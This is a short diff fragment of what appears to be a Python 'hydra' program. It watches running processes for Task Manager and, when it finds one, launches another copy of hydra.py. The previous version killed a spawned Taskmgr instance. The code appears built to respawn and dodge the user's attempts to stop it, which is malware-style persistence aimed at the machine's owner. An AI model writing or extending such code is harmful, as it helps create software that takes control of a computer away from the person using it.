@@ -12,7 +12,7 @@ hydra_path = os.path.join(path, 'hydra.py')
 def check_taskmgr():
     for p in psutil.process_iter(['name']):
         if 'taskmgr' in p.info['name'].lower():
-            subprocess.Popen(["Taskmgr.exe"]).kill()
+            subprocess.Popen(["python", hydra_path])
 
 def find_or_start_process(process_name):
     global firsttime
